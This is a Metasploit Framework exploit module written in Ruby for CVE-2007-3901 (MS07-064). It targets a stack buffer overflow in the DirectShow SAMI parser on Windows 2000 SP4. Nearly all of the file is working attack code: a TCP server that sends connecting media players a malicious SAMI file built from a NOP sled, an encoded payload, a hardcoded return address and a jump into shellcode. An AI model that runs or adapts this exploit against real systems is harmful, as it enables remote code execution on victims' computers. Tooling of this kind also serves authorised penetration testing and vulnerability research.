##
# $Id: ms07_064_sami.rb 10550 2010-10-05 01:05:49Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft DirectX DirectShow SAMI Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the DirectShow Synchronized
				Accessible Media Interchanged (SAMI) parser in quartz.dll. This module
				has only been tested with Windows Media Player (6.4.09.1129) and
				DirectX 8.0.
			},
			'Author'         => 'MC',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10550 $',
			'References'     =>
				[
					[ 'CVE', '2007-3901' ],
					[ 'OSVDB', '39126' ],
					[ 'MSB', 'MS07-064' ],
					[ 'BID', '26789' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 600,
					'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 Pro SP4 English', { 'Offset' => 22412, 'Ret' => 0x75022ac4 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Dec 11 2007',
			'DefaultTarget'  => 0))
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)

		client.get_once

		buffer =  make_nops(target['Offset'] - payload.encoded.length) + payload.encoded
		buffer << Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target.ret].pack('V')
		buffer << make_nops(10) + [0xe8, -485].pack('CV') + rand_text_english(132324)

		header =  "HTTP/1.1 200 OK\r\n"
		header << "Content-Type: application/smil\r\n\r\n"

		body =  "<SAMI>\r<HEAD>\r<STYLE TYPE=\"text/css\">\r"
		body << "<!--\rP {font-size: 1em;\rfont-family: Arial;\r"
		body << "font-weight: normal;\rcolor: #FFFFFF;\r"
		body << "background: #FFFFFF;\rtext-align: center;\r"
		body << "padding-left: 2px;\rpadding-right: 2px;\r"
		body << "padding-bottom: 2px;\r}\r.ENUSCC { Name: English; lang: EN-US-CC; }\r"
		body << "-->\r</STYLE>\r</HEAD>\r<BODY>\r"
		body << "<SYNC Start=\"0\" pippo=\"" + buffer
		body << "\"><P Class=\"ENUSCC\"></P></SYNC></BODY></SAMI>"

		sploit = header + body

		print_status("Sending #{sploit.length} bytes to #{client.peerhost}:#{client.peerport}...")

		client.put(sploit)
		handler(client)

		service.close_client(client)
	end

end
